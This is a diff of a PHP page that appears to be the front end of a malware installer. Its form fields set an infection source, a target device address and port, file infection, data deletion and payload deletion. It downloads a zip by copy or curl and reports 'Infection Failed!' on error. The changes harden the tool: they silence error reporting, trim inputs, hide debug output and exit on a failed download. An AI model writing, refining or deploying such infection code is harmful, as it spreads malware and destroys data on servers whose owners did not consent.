@@ -1,7 +1,7 @@
 <?php 
     if(session_status()!=PHP_SESSION_ACTIVE) session_start();
     error_reporting(E_ALL ^ E_WARNING);
-    
+    error_reporting(0);
     if(file_exists(getcwd().'/data/constants.php'))
     {
         require_once(getcwd().'/data/constants.php');
@@ -33,7 +33,7 @@
         <style>
                body{
                     background-color: black;
-                    padding: 0px;
+                    padding: 0px 0px 340px;
                     color: #fff;
                 }
                 form{
@@ -286,7 +286,7 @@
                 #loading > h2 {
                     font-size: 86%;
                     text-align: center;
-                    margin-top: 25%;
+                    margin-top:25%;
                 }
         </style>
         <script type="text/javascript">
@@ -320,9 +320,9 @@
         $bRemovePreviousInstall = isset($_POST['remove_previous_install']) ? $_POST['remove_previous_install'] : 0;
         $bDownloadLatestVersion = isset($_POST['download_latest_version']) ? $_POST['download_latest_version'] : 0;
         $sInfectionResource = (isset($_POST['infection_resource']) && $_POST['infection_resource'] == "branch_value") ? "G" : "I";
-        $sBranchName = $_POST['branch_name'];
-        $sDeviceAddress = $_POST['device_address'];
-        $nPort = $_POST['port_number'];
+        $sBranchName = trim($_POST['branch_name']);
+        $sDeviceAddress = trim($_POST['device_address']);
+        $nPort = trim($_POST['port_number']);
         $bInfectFiles = isset($_POST["infect_files"]) ? $_POST["infect_files"] : 0;
         $bDeleteData = isset($_POST["delete_data"]) ? $_POST["delete_data"] : 0;
         $bDeletePayload = isset($_POST['delete_payload']) ? $_POST['delete_payload'] : 0;
@@ -486,7 +486,7 @@
                 $debug = 1;
                 $result=true;
 
-                if($debug) { echo "<h2>Moving directory</h2><p> From:<br> $dir <br>To: $dest</p>";}
+                //if($debug) { echo "<h2>Moving directory</h2><p> From:<br> $dir <br>To: $dest</p>";}
 
                 $path = dirname(__FILE__);
                 $files = scandir($dir);
@@ -915,6 +915,7 @@
                         // As download failed delete empty zip file!
                         if ($debug) { echo "<h2>Download with CURL failed</h2>";}
                         echo "<h3>Infection Failed!</h3><p>Couldn't download with either copy or curl</p>";
+                                                exit();
                         unlink($zipfile);
                         //promptForIP();
                     } // If Download failed using CURL 
